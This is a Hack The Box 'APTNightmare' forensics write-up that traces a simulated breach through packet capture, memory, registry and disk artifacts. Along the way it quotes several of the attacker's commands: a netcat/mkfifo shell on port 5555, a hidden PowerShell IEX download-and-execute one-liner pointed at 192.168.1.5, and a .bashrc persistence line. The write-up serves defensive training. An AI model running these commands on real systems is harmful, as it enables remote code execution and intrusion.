# APTNightmare

> Write-up author: jon-brandy

![image](https://github.com/user-attachments/assets/73392552-cbb7-450d-947d-f045e0be264e)


## Lessons Learned:
1. Analyzed packet capture file using `wireshark`.
2. Reviewing nmap activities and identified open ports. (using small `tshark` foo).
3. Identifying DNS Zone Transfer Activity and compromised subdomain along with credentials used by the threat actor.
4. Using `volatility` to analyze memory dump from a web server (using ubuntu profile).
5. Using `wireshark` and `volatility` to identify command used by the attacker to gain initial access to the web server and what binary is used for privilege escalation.
6. Correlated the technique used with MITRE framework.
7. Listing debian package and extract it's content using `dpkg`.
8. Using `regripper` to parse common registry hives.
9. Identifying and review program execution artifacts.
10. Using `LECmd.exe` to analyze **.lnk** files.
11. Using `Registry Explorer` to review registry hives, identify dirty log, and create clean hive from transaction logs.
12. Using `FTK Imager` to review acquisitioned disk.
13. Conducted small e-mail forensic for phishing mail.
14. Using `PECmd.exe` to analyze prefetch file.
15. Using `MFTExplorer.exe` to parse and analyze raw $MFT file. 
16. Using `EvtxEcmd.exe` to parse windows powershell and powershell operational event logs to csv.
17. Using `Timeline Explorer` to review csv file.
18. Using `cyberchef` to decode encoded powershell command (formula used --> from base64 and gunzip). Afterwards using formula (from base64 and xor 35 decimal with null preserving).
19. Identifying threat label using virus total.
20. Analyzing cobalt strike beacon using `1768.py` script.
21. Identifying new tasks created by the threat actor (persistence artifacts).
   
## SCENARIO:

<p align="justify">We neglected to prioritize the robust security of our network and servers, and as a result, both our organization and our customers have fallen victim to a cyber attack. The origin and methods of this breach remain unknown. Numerous suspicious emails have been detected. In our pursuit of resolution, As an expert forensics investigator, you must be able to help us.</p>

## STEPS:
1. In this case, we are tasked with investigating a cybersecurity breach, the origin and methods of which are still unknown. However, it is known that numerous suspicious emails have been detected.In this case, we are tasked with investigating a cybersecurity breach, the origin and methods of which are still unknown. However, it is known that numerous suspicious emails have been detected.
2. As a forensic investigator we are given 4 files which we need to analyze. There are 2 acquisitioned data (disk and RAM), a captured network file, and an ubuntu profile. 

![image](https://github.com/user-attachments/assets/f62c048e-d09c-4a9b-9d8a-831c62632bc6)


3. Based from the file naming, we can indicate the infected device is the CEO's and the captured RAM is from the web server.

> 1ST QUESTION --> ANS: `192.168.1.3`

![image](https://github.com/user-attachments/assets/b9b4dc1d-29c7-4ca7-9f54-403e7cca76ce)


4. The easiest way to identify the IP address of the infected web server is by analyzing the pcap file. Because the network activity is already captured, hence it should be easier for us.

![image](https://github.com/user-attachments/assets/7dfc76a5-ebde-4733-b4a6-3a2ce4b21c4c)


5. Upon checking IP addresses with the most activity, we should noticed top 3 IP address with the most activity.

![image](https://github.com/user-attachments/assets/fabb3d8c-f064-4927-b255-cbf26bb5445a)


6. We can start reviewing activity from those 3 IP. But let's start by reviewing activity from source IP `192.168.1.5` and destination IP `192.168.1.3`.
7. Noticed that mostly IP `192.168.1.5` is requesting resource to `192.168.1.3`. This could indicate that `192.168.1.3` is a web server.

![image](https://github.com/user-attachments/assets/06817fd6-2ffe-41ca-b23a-7bb05b7ca207)

8. Further analysis of the source IP behavior, we can identified several suspicious request from it. This raise a concern regarding an incoming threat --> web scanning activity.

![image](https://github.com/user-attachments/assets/f54b9957-8006-4050-a0d2-70fe7bb74a7f)

![image](https://github.com/user-attachments/assets/3e5bc71c-dd3f-45c1-9bcf-e2a79b287713)


9. Awesome! Now to make sure whether this is the compromised web server, let's identify web request that resulting to response code 200.

![image](https://github.com/user-attachments/assets/d0bac3b5-b393-4b36-ad14-094dd220e586)

10. Interesting! We found a local privilege escalation attempt inside the web server **already**. This stage is after the exploitation then, the attacker already gained initial access. This is enough to conclude that IP `192.168.1.3` is the compromised web server.

> 2ND QUESTION --> ANS: `192.168.1.5`

![image](https://github.com/user-attachments/assets/e47b56d0-f619-42c4-bab1-977d75b13d12)


11. Based on our previous analysis, we can conclude that the attacker IP is `192.168.1.5`.

> 3RD QUESTION --> ANS: 14

![image](https://github.com/user-attachments/assets/d1af8af5-47ee-47a4-a4ea-951a69d446c3)


12. To identify open ports that identified by the threat actor, we can simply filter for communications between the threat actor's IP and the web server's IP but with `SYN/ACK` flag.
13. **SYN/ACK** flag indicate that the web server responded with the SYN flag --> indicate the port that used to communicate is found by the web server).
14. To simplify things, I used `tshark` and a small filter.

> COMMAND:

```
tshark -r traffic.pcapng -Y "ip.src == 192.168.1.3 && ip.dst == 192.168.1.5 && tcp.flags.syn == 1 && tcp.flags.ack == 1" -T fields -e tcp.srcport | sort -n | uniq -c
tshark -r traffic.pcapng -Y "ip.src == 192.168.1.3 && ip.dst == 192.168.1.5 && tcp.flags.syn == 1 && tcp.flags.ack == 1" -T fields -e tcp.srcport | sort -n | uniq -c | wc -l

It is crucial to use flag sort first before uniq.
```

![image](https://github.com/user-attachments/assets/4127fa8b-8857-4458-9b99-9e541d8ec1c6)

![image](https://github.com/user-attachments/assets/8bdb3caa-53e7-4b23-bf20-9ea7d067a704)


15. Awesome! We found 15 unique IPs. However, after submit the answer, HTB stated that I've submitted wrong answer. Knowing this I start to check each ports identified to check whether the **SYN/ACK** flag indeed are coming from a nmap scan response.
16. Long story short, found that port **5555** `SYN/ACK` response is not coming from the nmap scan.

![image](https://github.com/user-attachments/assets/244eb876-3152-4e22-830b-e4725f08d790)

17. Turns out it's from the reverse shell attempted by the threat actor. Found the attempt after filtering for POST request method usage. Anyway you shall find several SQLi attempt (blind and error-based), but this one is interesting. A reverse shell attempt at **dashboard.php**. So at this point the attacker seems logged in to the dashboard page.

![image](https://github.com/user-attachments/assets/24f6beeb-61d6-4325-abed-b2c0ff78c7a9)


> Decoded URL

![image](https://github.com/user-attachments/assets/52f46657-563e-4277-9b42-8924623c3d1c)


18. Correlating with our previous **pwnkit** binary execution, hence it indicate the reverse shell attempt is success, hence this trigger port 5555 to get **SYN/ACK** flag.
19. Now this conclude the identified open port is **14**.


> 4TH QUESTION --> ANS: 25,53,80,110,119

![image](https://github.com/user-attachments/assets/97cf7841-c653-4443-9024-8c0e7e333969)


20. Again, based on previous identified port, since it's already sorted, hence we can identified the top 5 are `25,53,80,110,119`.

![image](https://github.com/user-attachments/assets/dd13f059-4252-43f5-b9f7-d4398f4e9a21)


> 5TH QUESTION --> ANS: DNS Zone Transfers

![image](https://github.com/user-attachments/assets/f3184f83-beba-41ac-b0a5-361520d9114c)


21. A misconfiguration which allows the threat actor to enumerate all subdomains, is called **DNS Zone Transfers**. We can identify this activity by **AXFR** packets. AXFR (Full Zone Transfers) is a protocol that transfers an entire DNS zone file from one DNS server to another.
22. We can verify this by reviewing the packet data.

![image](https://github.com/user-attachments/assets/b2202941-3f0a-46ce-afa7-ddbb22eb2271)


![image](https://github.com/user-attachments/assets/e11fb748-5d08-4109-adf8-d9a19e32abd3)


> 6TH QUESTION --> ANS: 9

![image](https://github.com/user-attachments/assets/7ea00737-7d18-4ef0-97ff-74c3e97c2b4f)


23. Based on previous findings, it is clear that the threat actor identified **9** subdomains.

![image](https://github.com/user-attachments/assets/165eb008-2ba4-449d-8595-f9b3ba89a30b)


> 7TH QUESTION --> ANS: `sysmon.cs-corp.cd`

![image](https://github.com/user-attachments/assets/72b71a83-cf42-4cc9-b82c-c038753ea294)


24. To identify the compromised subdomain, simply check the request header of previous reverse shell attempt. It is `sysmon.cs-corp.cd`

![image](https://github.com/user-attachments/assets/12e218e9-ffec-40bc-9c0e-1f45d88ee3fc)




> 8TH QUESTION --> ANS: `admin@cs-corp.cd:Pass@000_`

![image](https://github.com/user-attachments/assets/8ccab98f-94b0-49ef-84a6-9f478c1db49f)


25. Remember one behavior of a web server once a correct credential is passed at a login page. The user shall gets redirected to the dashboard page right? Hence we just need to filter activity from the threat actor's IP and filter for response code **302**.

![image](https://github.com/user-attachments/assets/90753336-2135-471b-b33b-3fb3d28394c3)

26. Following the http stream, we can identified the credential used by the threat actor to login. It is --> `admin@cs-corp.cd:Pass@000_`

![image](https://github.com/user-attachments/assets/fe2e53f6-cbf7-4041-a8af-c714af629887)


> 9TH QUESTION --> ANS: `|mkfifo /tmp/mypipe;cat /tmp/mypipe|/bin/bash|nc -l -p 5555 >/tmp/mypipe`

![image](https://github.com/user-attachments/assets/a36ebc73-d9da-49f7-9045-a3d4aa352df6)


27. Based from our previous finding we identified the threat actor attempted a bash reverse shell with port 5555. Afterwards, the next traffics are TCP and we can see threat actor's activities at the web server. This conclude the threat actor gained access using the reverse shell.

![image](https://github.com/user-attachments/assets/b4cf6f17-6002-470c-aa12-bcc81a57c04f)


> 10TH QUESTION --> ANS: `CVE-2021-4034`

![image](https://github.com/user-attachments/assets/d7178191-3ed0-454c-b735-8dcd1969fcc6)


28. Again, refer back to our previous finding, we identified **pwnkit** execution. It is a binary used to do privilege escalation at linux environment.

![image](https://github.com/user-attachments/assets/9a9774cc-ff89-47f7-b11d-5816d12f945a)

29. Searching on the internet regarding CVE ID related to pwnkit, resulting to several article mentioning --> `CVE-2021-4034`. Here is one of them:


![image](https://github.com/user-attachments/assets/5bd6c2ee-c387-45b4-bace-373898ce9625)



> 11TH QUESTION --> ANS: `T1053.003`

![image](https://github.com/user-attachments/assets/c1cfa667-dbea-46a1-bfb7-a75a8284d5f4)


30. Further analysis, found an attempt to replace crontab file with the forged one. Crontab is a configuration file that schedules and automate tasks in Unix-like OS.

![image](https://github.com/user-attachments/assets/9626c141-4a3b-49c4-b12d-fd46c3c46225)


31. Searching on the internet regarding mitre technique related to persistence mechanisms using scheduled task using cron shall resulting to --> `T1053.003`.

![image](https://github.com/user-attachments/assets/480fc1ef-85b6-4bee-8945-0960025f6b6d)


> 12TH QUESTION --> ANS: `T1195.002`.

![image](https://github.com/user-attachments/assets/f42f9999-8f00-4894-a4d3-1648b6e51612)


31. Reviewing the packet stream again, the threat actor's changed several binaries at the download directory along with the **debian package** file.

![image](https://github.com/user-attachments/assets/7727ade2-334c-4c80-ba12-1e52ed0cafca)

32. This activity is what called as **Supply Chain Attack**. In MITRE, the technique discussing this is documented as ID `T1195.002`.

![image](https://github.com/user-attachments/assets/efe8659b-76a6-4cbe-80f1-fa4cb3fc2656)


> 13TH QUESTION --> ANS: `echo cs-linux && >> ~/.bashrc`

![image](https://github.com/user-attachments/assets/8b7fe429-49b7-4edc-8eac-600c7e855a0d)


33. To analyze debian file package we can utilize `dpkg` binary without using the package directly. Before that let's export the debian file from the pcap file.

![image](https://github.com/user-attachments/assets/96295270-0908-434e-a8e1-227bdbe55127)


34. Afterwards, let's list what's inside the debian package.

> COMMAND:

```
dpkg -c cs-linux.deb
```

![image](https://github.com/user-attachments/assets/061d900a-6bc2-40b2-987e-74e5e326d9b8)


35. Seems our interest should be at inside the **/bin/** directory. Let's extract it's content now.

> COMMAND:

```
dpkg-deb -x cs-linux.deb .
```

![image](https://github.com/user-attachments/assets/01f0c01f-f0d6-4101-a914-338c918d90da)


36. Interesing! It is a python script file. Decoding the base64 text shall give us the persistence command used by the threat actor inside the forged debian package.

![image](https://github.com/user-attachments/assets/959f5982-d2cd-4fe3-8255-d5ecd951e251)


![image](https://github.com/user-attachments/assets/74a71eab-f04c-4c77-b2a4-ddde44a64601)



> 14TH QUESTION --> ANS: citserver

![image](https://github.com/user-attachments/assets/f8bb72f2-a79d-41f4-9f25-53a027dd8a21)


37. Now let's shift our focus to analyze the acquisitioned web server's RAM using volatility. Don't forget to import or copy the ubuntu zip profile given to volatility linux profile table.

![image](https://github.com/user-attachments/assets/799ac070-63b7-4ecb-9650-f717fe7d59b1)


38. Next to check and use the profile, we can execute this command:

```
volatility --info
```

![image](https://github.com/user-attachments/assets/26e1d332-c3ca-4645-be39-bf5bd55c45d6)


39. Awesome! It is known that the threat actor sent phish email to the victim through the web server. Now let's start by reviewing command line history or process running during the acquisition to identify any suspicious command line or process.

> REVIEWING COMMAND LINE HISTORY:

```
sudo python2 /opt/volatility/vol.py -f Memory_WebServer.mem --profile=LinuxUbuntu_5_3_0-70-generic_profilex64 linux_bash
```

40. Awesome, we can see all bash history of the threat actor's activity.

![image](https://github.com/user-attachments/assets/74d7a1f9-1ee5-4c8a-a6dd-0265283c3741)


41. However, noticed that the threat actor attempted to remove and tamper with the `.bash_history` file. However I did not find any interesting info here.

![image](https://github.com/user-attachments/assets/2e748846-ce17-44c6-bdc4-ed08d5d42a7b)


42. Moving on to check what processes are running during the acquisition process, found a **citserver** is running.

![image](https://github.com/user-attachments/assets/3c367d8b-f697-4e0b-a089-8add445d0495)


43. **Citserver** provides Data-storage and Connection-oriented protocols like IMAP/POP/SMTP. Which is a protocol for e-mail.
44. Nice! Let's gather the full commands of the process executed. In volatility2 we can use plugin **linux_psaux**.

![image](https://github.com/user-attachments/assets/e11d1c4d-465f-4d03-b69a-831c695ee1a1)

45. Based on the command above, it supports our speculation. **Citserver** should be the process executed to send phish email to server.

> 15TH QUESTION --> ANS: `Review Revised Privacy Policy`.

![image](https://github.com/user-attachments/assets/01cc74a3-9c67-46a4-bb5d-e951f055057f)


46. To identify the e-mail phishing subject, I strings the memory dump and search for **subject**. This should be not the intended way btw 🙏🏻, I used a cheat way to identify the subject easily. Remembering the victim given an attachment, hence simply filter for `attachment; filename` and `Subjects: `.

> RESULT

![image](https://github.com/user-attachments/assets/5565af00-0d03-44f7-b135-d3bdfdfbe352)


47. Noticed that **Citadel** is mentioned again, our previous speculations indeed correct. Anyway, based on the text message, it seems the threat actor tricked the user by make the file attached seen as an updated privacy policy file that requires further review.

![image](https://github.com/user-attachments/assets/baa7df50-4e82-4529-bffb-326ab3547c14)


48. Anyway here's the result for `Subjects: ` search. We identified the e-mail subject.

![image](https://github.com/user-attachments/assets/af646aec-cf79-4713-991a-d5068357c405)


> 16TH QUESTION --> ANS: `policy.docm`

![image](https://github.com/user-attachments/assets/96e7114c-f2a0-4f85-bbeb-7b3df5826fb4)


49. Based on our previous finding, it is quite clear that **.docm** file should be our interest. However there is another file with extension .txt but should not be our interest.
50. To support our assumption, let's retrieve the .docm file from the acquisitioned disk. Let's use FTK Imager to review it.

> Using FTK Imager

![image](https://github.com/user-attachments/assets/e2e26d00-54a9-40a1-9220-97b1a81f1f7c)


51. However, we found that **policy.docm** file seems removed but we can utilize one of **program execution artifacts** --> file with `.lnk` extension. This file is created or modified when certain programs or files are executed on a windows systems.

![image](https://github.com/user-attachments/assets/bcfc8b22-9e73-48d0-b0a6-31d07bc8b130)

#### NOTES:

```
At this rate, I don't think using plaso to create not so super timeline is necessary,
knowing we already got what we're looking for now. 
```

52. Also noticed that we identified the victim username --> ceo-us.
53. Now to analyze `.lnk` file we can use `LECmd.exe` tool.

> COMMAND:

```
.\LECmd.exe -f "C:\Cases\APTN1ghtm4r3\DiskImage\policy.lnk"
```

54. We can retrieve much info regarding the file but sadly not the content of it. However, noticed that we identified the machine hostname, MFT entry, and file timestamp.


![image](https://github.com/user-attachments/assets/54da7753-b737-45d2-a4d6-bec4d26bf3c0)


55. Anyway, since the file is accessed, then we can check the sysmon log to identify it's content or even we can start by playing with `$MFT` file and carve from `$DATA` attribute (very unlikely for this case).
56. Let's play simple by parsing the event log file using `EvtxEcmd.exe` and view the parsed csv file with `Timeline Explorer`.
57. Sadly, we did not have sysmon event log here, this leaves us to no clue what could be inside of `policy.docm` file.

![image](https://github.com/user-attachments/assets/bd2b1085-6ee8-43fe-b21c-68911b3d3cd1)

58. However I started to parse each common registry hives using regripper and indeed found and don't forget that you can detect dirty log and create the updated one by combining each transaction log using `registry explorer`.

> COMMON REGISTRY HIVE PARSED

```
- NTSUSER.dat
- SECURITY.DAT
- SOFTWARE.DAT
- SYSTEM.DAT
- UsrClass.dat
- DEFAULT.DAT
```

> Evidence regarding detecting dirty log and combining transaction log.

![image](https://github.com/user-attachments/assets/2757e1aa-e10f-464f-acfb-19de4cec36ad)

![image](https://github.com/user-attachments/assets/e040100f-dac0-4485-8ebe-3d7508b6314c)

![image](https://github.com/user-attachments/assets/7682aef4-1865-438a-8bbf-9cf46668ab31)


> COMMAND TO PARSE REGISTRY HIVE USING REGRIPPER.EXE

```
for /r %i in (*) do (C:\Tools\RegRipper\RegRipper4.0-main\rip.exe -r %i -a > %i.txt)
```

59. Later on, the command above shall resulting to each hives have their own .txt file which contains information regarding regripper plugin (help us to gather information without drill down each hives directory at registy explorer).
60. Long story short, found that both `regripper` and `registry explorer` stated that `policy.docm` file indeed accessed, this proved the efficiency of `regripper` for DFIR.

![image](https://github.com/user-attachments/assets/a4af985a-f577-46e4-a2dd-d6dcb0a78970)

![image](https://github.com/user-attachments/assets/f393b03b-d8cb-4a5f-bae8-28dd18f1228f)


61. However, again! Still did not give us any clue what is the content of this file. Upon shifting our focus to another execution artifacts --> `prefetch file`. Found a powershell.exe prefetch file.

![image](https://github.com/user-attachments/assets/a4acbd17-eadc-4864-915f-09d8186d771f)

62. But before that, found interesting information at `NTUSER.DAT` hive at `UserAssist` plugin, it is known a **winword.exe** binary is executed (meaning a doc file is accessed), afterwards powershell.exe gets executed. This raise our suspicion and interest to review the **powershell.exe** prefetch file.

![image](https://github.com/user-attachments/assets/b3ff88e0-fd1a-4a51-8f1c-28680e0a5ff9)


> PECmd.exe result

```
.\PECmd.exe -f "C:\Cases\APTN1ghtm4r3\DiskImage\C\Windows\prefetch\POWERSHELL.EXE-920BBA2A.pf"
```

![image](https://github.com/user-attachments/assets/a9dab299-dbb1-4ce1-958d-bdc69de3145a)


63. After executed `PECmd.exe` binary on prefetch file, found interesting result where a powershell file and powershell module gets executed under `CEO-US` user.
64. Next, If we parse the `$MFT` into `MFTExplorer.exe`, we shall get confirmation that there is no timestomping because `$SI` is not less than `$FN`. Also the timestamp is somewhat have small difference than the .LNK file.

![image](https://github.com/user-attachments/assets/6e8c610b-4943-4a07-b169-a1d709921feb)


65. For the final analysis, if we correlate the timestamp execution of this docm file with the `Microsoft-Windows-Powershell-Operation` event log.

```
.\EvtxECmd.exe -f "C:\Cases\APTN1ghtm4r3\DiskImage\C\Windows\System32\winevt\logs\Microsoft-Windows-PowerShell%4Operational.evtx" --csv . --csvf "powershell-operation.csv"

Then review the csv file using timeline explorer.
```

![image](https://github.com/user-attachments/assets/3d6371ce-2722-482e-9841-03fc1e912789)


```
On LNK file:
- Modified: 02:15:48
- Last Access: 02:15:22

On $MFT:
- Modified: 02:15:47
- Last Access: 02:15:22

Malicious Powershell Script Execution:
- Execution: 02:16:09
```

66. With every of this condition and timestamp, we can conclude that `policy.docm` is indeed the malicious file and contain powershell script which used to gain initial access at the victim machine.



> 17TH QUESTION --> ANS: `ceo-ru, ceo-us`

![image](https://github.com/user-attachments/assets/4748107b-0a8e-4faf-9a50-a0188a15d1d1)


67. Based on our previous analysis, we found one username of one of the CEO that received the malicious attachment. We identified "ceo-us" username.
68. Again, this is a cheat way. What I did simply filter for `ceo-` and resulting to another username named `ceo-ru`.

![image](https://github.com/user-attachments/assets/9c619140-1131-430d-84d5-74fb73d1f29b)


69. Further review, found no other usernames. This conclude there are only two CEOs received the phish mail.


> 18TH QUESTION --> ANS: `desktop-els5jak`

![image](https://github.com/user-attachments/assets/35922d0f-1aa8-4964-a917-2b5d6921fed8)


70. There are many ways to identify it and we've done it few ways previously. The evidence I provided below is the example to identify the infected device's hostname by reviewing the `.lnk` file.

![image](https://github.com/user-attachments/assets/5ff1ff50-199a-4f29-98b3-1d090b3cc58b)


> 19TH QUESTION --> ANS: `C:\USERS\CEO-US\DOWNLOADS\POLICY.DOCM`

![image](https://github.com/user-attachments/assets/07ba599e-943b-4ebf-b682-ac31cf0f0623)

71. Goes the same for this one, many ways to identify the filepath. The evidence I provided below is the example to identify the filepath of the malicious document by loading the raw **$MFT** file to `MFTExplorer.exe`.

![image](https://github.com/user-attachments/assets/79299b0d-e66b-4824-8c37-2f9f8ada9133)
 


> 20TH QUESTION --> ANS: `powershell.exe -nop -w hidden -c IEX ((new-object net.webclient).downloadstring('http://192.168.1.5:806/a'))`

![image](https://github.com/user-attachments/assets/76c9edc4-6c82-41fe-9af1-1ad69081318a)


72. Now refer back way to our first finding when searching the red flag indicator for `policy.docm` file. At **Windows Powershell** event log we previously identified a suspicious powershell execution.
73. However, since the threat actor not physically accessed the threat actor's device, hence the activities related to this can be seen at the pcap file (which captured all network traffic communications). Although, we can decode the base64 by manually copy the value at each log with eventID `4101`, but let's see if the powershell execution captured as a whole in one packet data.
74. Upon reviewing each packet log, we can see different IP comes in traffic --> `192.168.1.7` and this IP communicates with `192.168.1.5`.

![image](https://github.com/user-attachments/assets/8f4476cc-d310-4428-8c3e-c85b97adb868)


75. Checking **endpoints** in wireshark, found list of IPs which categorized as endpoint and one of them is IP `192.168.1.7`. This conclude that IP `192.168.1.7` should be the victim's IP.

![image](https://github.com/user-attachments/assets/89403dfc-5c1d-40e2-97e4-0907742edff2)


76. Awesome, let's filter for http packets for IP `192.168.1.7` and `192.168.1.5`, also follow the packet stream.

![image](https://github.com/user-attachments/assets/2e0384f4-497f-4b3c-b1c5-61719becb60d)

> RESULT

![image](https://github.com/user-attachments/assets/dff07dcd-da47-4c1e-bfa3-cb02227b3302)


77. Awesome! Just like what we predicted before, the execution is captured. Now let's copy the encoded base64 text and decode it using cyberchef.

> RESULT

![image](https://github.com/user-attachments/assets/8f2e4db0-56eb-4d0b-8af9-28f229ab20d2)


78. Interesting, upon reviewing the script. Found another embedded base64 encoded powershell command and scrolling down below we can identified a logic to xor each character with **35**.

![image](https://github.com/user-attachments/assets/f65b4a6b-d966-4c30-8cf2-2ac4acd887eb)

![image](https://github.com/user-attachments/assets/17cbc63c-6669-4a49-a0fe-05e7df93fd8b)


79. Simply doing the same at cyberchef, shall resulting to an executable file.

![image](https://github.com/user-attachments/assets/b90270c5-094f-479a-84c1-b9d32de15412)


80. Download the file and pass it to threat intelligence, found the binary is indeed a malicious file.

![image](https://github.com/user-attachments/assets/1831697a-084e-46c3-9ffd-70ff2c6d40fa)

89. However we still did not find the command used by the threat actor to gain initial access, based on the cyber kill chain, this command should refer to the malware installation command.

> 21ST QUESTION --> ANS: `trojan.cobaltstrike/beacon`

![image](https://github.com/user-attachments/assets/22e67f89-e4fa-48e2-9511-96c105bc6efc)




> 22ND QUESTION --> ANS: `windows-beacon_http-reverse_http`

![image](https://github.com/user-attachments/assets/a09f7537-4060-4c40-8680-8c4071229499)


> 23RD QUESTION --> ANS: `WindowsUpdateCheck`

![image](https://github.com/user-attachments/assets/b360d8f3-01a6-433e-a51b-df1380e705bb)


## IMPORTANT LINKS:

```
https://www.acunetix.com/blog/articles/dns-zone-transfers-axfr/
https://github.com/ly4k/PwnKit
https://blog.qualys.com/vulnerabilities-threat-research/2022/01/25/pwnkit-local-privilege-escalation-vulnerability-discovered-in-polkits-pkexec-cve-2021-4034
```
